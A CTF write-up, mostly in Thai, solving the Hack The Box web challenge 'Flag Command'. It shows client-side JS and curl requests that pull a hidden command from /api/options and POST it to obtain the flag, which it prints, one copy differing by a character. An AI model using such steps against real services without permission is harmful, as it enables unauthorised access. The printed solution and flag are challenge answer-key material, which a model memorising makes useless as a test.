# Flag Command — CTF Writeup

## Challenge Info

- Name: Flag Command
- Category: Web
- Flag: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_8080c995f6e40237d38662a66cbb23d8}

---

## Description

เว็บเกม text-based adventure แบบ terminal ชื่อ "Dimensional Escape Quest" ให้ผู้เล่นำทางออกจากเขาวงกตในป่าโดยพิมพ์คำสั่งเลือกทิศทาง

---

## Reconnaissance

scan ด้วย feroxbuster พบไฟล์ JavaScript ที่น่าสนใจ:

- /static/terminal/js/main.js
- /static/terminal/js/commands.js
- /static/terminal/js/game.js

เนื่องจากเป็น client-side game logic การอ่าน source ของ JS เหล่านี้มักเผยช่องโหว่ได้

---

## Analysis

อ่าน main.js พบ logic การตรวจสอบคำสั่งใน function CheckMessage():

```javascript
if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand) {
    await fetch('/api/monitor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 'command': currentCommand })
    })
```

จุดสำคัญคือมี availableOptions['secret'] ซึ่งเป็นชุดคำสั่งลับ และ availableOptions ทั้งหมดถูกดึงมาจาก endpoint /api/options

```javascript
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;
        })
}
```

แม้ secret command จะไม่ถูกแสดงในหน้าเกม แต่ API ก็ส่งมาให้ client ทั้งหมด

---

## Exploitation

ดึงคำสั่งทั้งหมดรวม secret จาก /api/options:

```bash
curl "http://154.57.164.82:30395/api/options"
```

พบ secret command:

```json
"secret": [
    "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
]
```

ส่ง secret command ไปยัง /api/monitor:

```bash
curl -X POST "http://154.57.164.82:30395/api/monitor" \
  -H "Content-Type: application/json" \
  -d '{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

ได้ flag กลับมาทันที:

```json
{
  "message": "HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_8080c995f6e40237d38662a66cb23d8}"
}
```

---

## Flag

HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!_8080c995f6e40237d38662a66cbb23d8}

---

## Root Cause

เซิร์ฟเวอร์ส่งข้อมูลคำสั่งลับ (secret) ทั้งหมดไปยัง client ผ่าน /api/options ทำให้ผู้เล่นสามารถอ่านและใช้คำสั่งลับได้โดยไม่ต้องเล่นเกมจริง เป็นกรณีคลาสิกของ sensitive data exposure / client-side trust ชื่อ flag เองก็บอกใบ้ว่า "Developer tools are best"

แก้ไขได้โดยเก็บ logic การตรวจสอบคำสั่งลับไว้ฝั่ง server เท่านั้น ไม่ส่งคำตอบไปให้ client

---

## Attack Chain

feroxbuster → พบ main.js → อ่านพบ availableOptions['secret'] และ /api/options → curl /api/options เพื่อดึง secret command → POST /api/monitor ด้วย secret command → ได้ flag

---
